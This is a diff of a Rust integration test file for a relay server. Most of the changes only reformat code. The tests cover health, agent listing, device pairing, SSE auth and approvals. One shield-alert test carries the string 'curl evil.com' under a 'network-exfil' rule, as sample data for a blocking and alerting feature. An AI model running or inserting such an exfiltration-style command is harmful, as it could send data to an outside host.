@@ -9,13 +9,13 @@ use axum::Router;
 use flowlink_core::Message;
 use flowlink_relay::approval::ApprovalQueue;
 use flowlink_relay::auth::{AuthManager, Client};
+use flowlink_relay::control_plane::ControlPlaneState;
 use flowlink_relay::devices::DeviceManager;
 use flowlink_relay::eventbus::EventBus;
 use flowlink_relay::handler::RelayHandler;
 use flowlink_relay::pool::{AgentInfo, AgentPool};
 use flowlink_relay::registry::Registry;
 use flowlink_relay::server::{build_router, AppState, ShieldAlertManager};
-use flowlink_relay::control_plane::ControlPlaneState;
 
 // ── helpers ──────────────────────────────────────────────
 
@@ -26,8 +26,15 @@ fn make_state() -> (AppState, tempfile::TempDir) {
     let auth = Arc::new(AuthManager::new());
     let approvals = Arc::new(ApprovalQueue::new());
     let registry = Arc::new(Registry::new(tmp.path()).unwrap());
-    let handler = Arc::new(RelayHandler::new(pool.clone(), auth.clone(), eventbus.clone(), approvals.clone()));
-    let device_manager = Arc::new(DeviceManager::new(flowlink_relay::devices::PushConfig::default()));
+    let handler = Arc::new(RelayHandler::new(
+        pool.clone(),
+        auth.clone(),
+        eventbus.clone(),
+        approvals.clone(),
+    ));
+    let device_manager = Arc::new(DeviceManager::new(
+        flowlink_relay::devices::PushConfig::default(),
+    ));
 
     // Register a client for auth
     auth.register_client(Client {
@@ -102,7 +109,14 @@ async fn health_returns_ok() {
     let (state, _tmp) = make_state();
     let (url, _h) = spawn_relay(state).await;
     let client = reqwest::Client::new();
-    let resp: serde_json::Value = client.get(&format!("{url}/health")).send().await.unwrap().json().await.unwrap();
+    let resp: serde_json::Value = client
+        .get(&format!("{url}/health"))
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(resp["status"], "ok");
     assert_eq!(resp["agents"], 0);
 }
@@ -117,9 +131,17 @@ async fn register_two_agents_and_list() {
     let client = reqwest::Client::new();
     let agents: Vec<serde_json::Value> = client
         .get(&format!("{url}/api/agents"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(agents.len(), 2);
-    let ids: Vec<&str> = agents.iter().map(|a| a["agent_id"].as_str().unwrap()).collect();
+    let ids: Vec<&str> = agents
+        .iter()
+        .map(|a| a["agent_id"].as_str().unwrap())
+        .collect();
     assert!(ids.contains(&"alpha"));
     assert!(ids.contains(&"beta"));
 }
@@ -134,12 +156,14 @@ async fn eventbus_heartbeat_roundtrip() {
     let mut rx = eventbus.subscribe("heartbeat");
 
     // Publish via the eventbus (simulates agent sending heartbeat through WS)
-    let hb = Message::new(flowlink_core::MessageType::Heartbeat)
-        .with_agent_id("agent-x");
+    let hb = Message::new(flowlink_core::MessageType::Heartbeat).with_agent_id("agent-x");
     let json = serde_json::to_string(&hb).unwrap();
     eventbus.publish("heartbeat", &json);
 
-    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await.unwrap().unwrap();
+    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+        .await
+        .unwrap()
+        .unwrap();
     let parsed: Message = serde_json::from_str(&received).unwrap();
     assert_eq!(parsed.agent_id.as_deref(), Some("agent-x"));
 }
@@ -162,7 +186,10 @@ async fn exec_done_message_flows_through_eventbus() {
     let json = serde_json::to_string(&done).unwrap();
     eventbus.publish("exec_done", &json);
 
-    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await.unwrap().unwrap();
+    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+        .await
+        .unwrap()
+        .unwrap();
     let parsed: Message = serde_json::from_str(&received).unwrap();
     assert_eq!(parsed.msg_type, flowlink_core::MessageType::ExecDone);
     let payload: flowlink_core::ExecDonePayload =
@@ -181,7 +208,12 @@ async fn device_pairing_full_flow() {
     let resp: serde_json::Value = client
         .post(&format!("{url}/api/devices/pair"))
         .json(&serde_json::json!({"user_id": "user-1"}))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     let code = resp["code"].as_str().unwrap();
     assert_eq!(code.len(), 6);
 
@@ -189,14 +221,24 @@ async fn device_pairing_full_flow() {
     let resp: serde_json::Value = client
         .post(&format!("{url}/api/devices/confirm"))
         .json(&serde_json::json!({"code": code, "name": "Pixel", "device_type": "android"}))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     let token = resp["token"].as_str().unwrap();
     assert!(!token.is_empty());
 
     // 3. List devices
     let devices: Vec<serde_json::Value> = client
         .get(&format!("{url}/api/devices?user_id=user-1"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(devices.len(), 1);
     assert_eq!(devices[0]["name"].as_str().unwrap(), "Pixel");
 
@@ -204,7 +246,9 @@ async fn device_pairing_full_flow() {
     let device_id = devices[0]["id"].as_str().unwrap();
     let resp = client
         .delete(&format!("{url}/api/devices/{device_id}"))
-        .send().await.unwrap();
+        .send()
+        .await
+        .unwrap();
     assert_eq!(resp.status(), 204);
 }
 
@@ -228,11 +272,19 @@ async fn shield_alert_ingest_and_sse() {
             "action": "blocked",
             "username": "root"
         }))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(resp["ok"], true);
 
     // Check SSE subscriber received it
-    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await.unwrap().unwrap();
+    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
+        .await
+        .unwrap()
+        .unwrap();
     let parsed: serde_json::Value = serde_json::from_str(&received).unwrap();
     assert_eq!(parsed["command"], "curl evil.com");
     assert_eq!(parsed["rule_name"], "network-exfil");
@@ -240,20 +292,35 @@ async fn shield_alert_ingest_and_sse() {
     // Verify via stats endpoint
     let stats: serde_json::Value = client
         .get(&format!("{url}/api/shield/stats"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(stats["pending"], 1);
     assert_eq!(stats["total_received"], 1);
 
     // Approve the alert
     let resp: serde_json::Value = client
         .post(&format!("{url}/api/shield/approve/1337"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(resp["ok"], true);
 
     // Now pending should be 0
     let stats: serde_json::Value = client
         .get(&format!("{url}/api/shield/stats"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(stats["pending"], 0);
     assert_eq!(stats["resolved"], 1);
 }
@@ -266,8 +333,12 @@ async fn sse_stream_receives_heartbeat() {
 
     // Connect SSE with valid token
     let resp = reqwest::Client::new()
-        .get(&format!("{url}/api/events?token=test-token&channels=heartbeat"))
-        .send().await.unwrap();
+        .get(&format!(
+            "{url}/api/events?token=test-token&channels=heartbeat"
+        ))
+        .send()
+        .await
+        .unwrap();
     assert!(resp.status().is_success());
 
     // Publish a heartbeat
@@ -286,7 +357,9 @@ async fn sse_no_token_returns_401() {
 
     let resp = reqwest::Client::new()
         .get(&format!("{url}/api/events"))
-        .send().await.unwrap();
+        .send()
+        .await
+        .unwrap();
     assert_eq!(resp.status(), 401);
 }
 
@@ -312,17 +385,33 @@ async fn approval_flow_roundtrip() {
     // Should show up in pending list
     let pending: Vec<serde_json::Value> = client
         .get(&format!("{url}/api/approvals"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(pending.len(), 1);
     assert_eq!(pending[0]["id"], "apr-1");
 
     // Approve via HTTP
     let resp: serde_json::Value = client
         .post(&format!("{url}/api/approvals/apr-1/approve"))
-        .send().await.unwrap().json().await.unwrap();
+        .send()
+        .await
+        .unwrap()
+        .json()
+        .await
+        .unwrap();
     assert_eq!(resp["ok"], true);
 
     // The oneshot receiver should get the decision
-    let decision = tokio::time::timeout(Duration::from_secs(2), rx).await.unwrap().unwrap();
-    assert_eq!(decision, flowlink_relay::approval::ApprovalDecision::Approved);
+    let decision = tokio::time::timeout(Duration::from_secs(2), rx)
+        .await
+        .unwrap()
+        .unwrap();
+    assert_eq!(
+        decision,
+        flowlink_relay::approval::ApprovalDecision::Approved
+    );
 }
